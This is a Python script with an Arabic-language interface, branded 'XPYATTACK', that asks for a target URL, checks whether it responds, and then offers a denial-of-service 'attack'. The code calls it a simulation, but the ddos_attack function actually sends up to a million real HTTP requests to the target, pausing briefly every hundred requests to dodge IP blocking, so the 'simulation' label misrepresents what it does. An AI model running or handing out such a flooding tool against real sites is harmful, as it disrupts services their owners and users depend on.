#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import time
import threading
from urllib.parse import urlparse
import sys
import os

# ألوان للـ CMD (ستعمل في VS Code أيضاً)
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
RESET = '\033[0m'
BOLD = '\033[1m'

def clear_screen():
    """مسح الشاشة"""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_ascii():
    """طباعة ASCII باللون الأحمر"""
    ascii_art = f"""
{RED}
╔╦╗╦╔═╗╔═╗╔╦╗╔═╗╔╦╗╔═╗╔╗╔╔╦╗
 ║ ║╚═╗╠═╣ ║ ╠═╣ ║ ║ ║║║║ ║ 
 ╩ ╩╚═╝╩ ╩ ╩ ╩ ╩ ╩ ╚═╝╝╚╝ ╩ 
╔═╗╔╦╗╔╦╗╔═╗╔╗╔╔═╗╔╦╗╔═╗
╠═╣ ║  ║ ╠═╣║║║╚═╗ ║ ║ ║
╩ ╩ ╩  ╩ ╩ ╩╝╚╝╚═╝ ╩ ╚═╝
╔╦╗╔═╗╔═╗╔╦╗╔╦╗╦ ╦╔╦╗╔═╗
 ║ ║ ║╠═╣ ║  ║ ╚╦╝ ║ ╠═╣
 ╩ ╚═╝╩ ╩ ╩  ╩  ╩  ╩ ╩ ╩
{RESET}
"""
    print(ascii_art)

def validate_url(url):
    """التحقق من صحة الرابط"""
    try:
        result = urlparse(url)
        if all([result.scheme, result.netloc]):
            return True, result.scheme
        else:
            # محاولة إضافة http:// إذا لم يكن موجود
            if not result.scheme:
                test_url = "http://" + url
                result = urlparse(test_url)
                if all([result.scheme, result.netloc]):
                    return True, "http"
            return False, None
    except:
        return False, None

def check_url_status(url):
    """فحص حالة الرابط"""
    try:
        response = requests.get(url, timeout=5, allow_redirects=True)
        return {
            'status_code': response.status_code,
            'reason': response.reason,
            'url': response.url,
            'scheme': urlparse(response.url).scheme
        }
    except requests.exceptions.ConnectionError:
        return {'error': 'فشل الاتصال - الرابط غير متاح'}
    except requests.exceptions.Timeout:
        return {'error': 'انتهت المهلة - الرابط بطيء أو لا يستجيب'}
    except requests.exceptions.RequestException as e:
        return {'error': f'خطأ: {str(e)}'}

def ddos_attack(url, num_requests=1000000):
    """محاكاة هجوم DDoS"""
    print(f"\n{RED}{BOLD}[!] بدء الهجوم على {url}{RESET}")
    print(f"{YELLOW}[*] سيتم إرسال {num_requests:,} طلب...{RESET}\n")
    
    successful = 0
    failed = 0
    
    for i in range(1, num_requests + 1):
        try:
            # إرسال الطلب
            response = requests.get(url, timeout=2)
            successful += 1
            status = f"{GREEN}✓ نجاح{RESET}"
        except:
            failed += 1
            status = f"{RED}✗ فشل{RESET}"
        
        # طباعة الرسالة الوهمية
        print(f"{CYAN}[{i:,}/{num_requests:,}] {YELLOW}Send Request{RESET} - {status}")
        
        # إبطاء قليل لتجنب حظر IP
        if i % 100 == 0:
            print(f"{MAGENTA}[✓] تم إرسال {i:,} طلب - نجاح: {successful} | فشل: {failed}{RESET}")
            time.sleep(0.1)
    
    print(f"\n{RED}{BOLD}[!] انتهى الهجوم!{RESET}")
    print(f"{GREEN}[✓] إجمالي الطلبات: {num_requests:,}{RESET}")
    print(f"{GREEN}[✓] الطلبات الناجحة: {successful:,}{RESET}")
    print(f"{RED}[✗] الطلبات الفاشلة: {failed:,}{RESET}")

def main():
    """الدالة الرئيسية"""
    clear_screen()
    print_ascii()
    
    print(f"{BOLD}{CYAN}╔{'═'*50}╗{RESET}")
    print(f"{BOLD}{CYAN}║{' ' * 15}أداة XPYATTACK للأمان السيبراني{' ' * 14}║{RESET}")
    print(f"{BOLD}{CYAN}╚{'═'*50}╝{RESET}\n")
    
    while True:
        # إدخال الرابط
        url_input = input(f"{WHITE}{BOLD}أدخل URL الهدف: {RESET}").strip()
        
        if not url_input:
            print(f"{RED}الرجاء إدخال رابط!{RESET}")
            continue
        
        # التحقق من صحة الرابط
        is_valid, scheme = validate_url(url_input)
        
        if not is_valid:
            print(f"{RED}الرابط غير صحيح!{RESET}")
            continue
        
        # تصحيح الرابط إذا لزم الأمر
        if not url_input.startswith(('http://', 'https://')):
            url_input = f"http://{url_input}"
            scheme = 'http'
        
        print(f"\n{GREEN}[✓] الرابط صحيح!{RESET}")
        print(f"{YELLOW}[*] البروتوكول المستخدم: {BOLD}{scheme.upper()}{RESET}")
        
        # فحص حالة الرابط
        print(f"\n{BLUE}[*] جاري فحص حالة الرابط...{RESET}")
        status_info = check_url_status(url_input)
        
        if 'error' in status_info:
            print(f"{RED}[✗] {status_info['error']}{RESET}")
        else:
            print(f"{GREEN}[✓] الرابط يعمل!{RESET}")
            print(f"{YELLOW}[*] الحالة: {status_info['status_code']} - {status_info['reason']}{RESET}")
            print(f"{YELLOW}[*] الرابط الفعلي: {status_info['url']}{RESET}")
            print(f"{YELLOW}[*] البروتوكول: {status_info['scheme'].upper()}{RESET}")
        
        # قائمة الخيارات
        print(f"\n{BLUE}{BOLD}الخيارات المتاحة:{RESET}")
        print(f"{WHITE}[1] {CYAN}DoS - هجوم حجب الخدمة (محاكاة){RESET}")
        print(f"{WHITE}[2] {CYAN}فحص رابط آخر{RESET}")
        print(f"{WHITE}[3] {CYAN}خروج{RESET}")
        
        choice = input(f"\n{WHITE}{BOLD}اختر رقم الخيار: {RESET}").strip()
        
        if choice == '1':
            # هجوم DoS المحاكى
            confirm = input(f"{RED}{BOLD}هل أنت متأكد من بدء الهجوم على {url_input}؟ (y/n): {RESET}").strip().lower()
            if confirm == 'y':
                try:
                    ddos_attack(url_input)
                except KeyboardInterrupt:
                    print(f"\n{RED}[!] تم إيقاف الهجوم بواسطة المستخدم{RESET}")
                except Exception as e:
                    print(f"{RED}[!] خطأ: {str(e)}{RESET}")
            else:
                print(f"{YELLOW}[*] تم إلغاء الهجوم{RESET}")
        
        elif choice == '2':
            continue
        
        elif choice == '3':
            print(f"\n{GREEN}شكراً لاستخدام XPYATTACK!{RESET}")
            sys.exit(0)
        
        else:
            print(f"{RED}اختيار غير صحيح!{RESET}")
        
        print("\n" + "="*50 + "\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{RED}{BOLD}[!] تم إيقاف البرنامج{RESET}")
        sys.exit(0)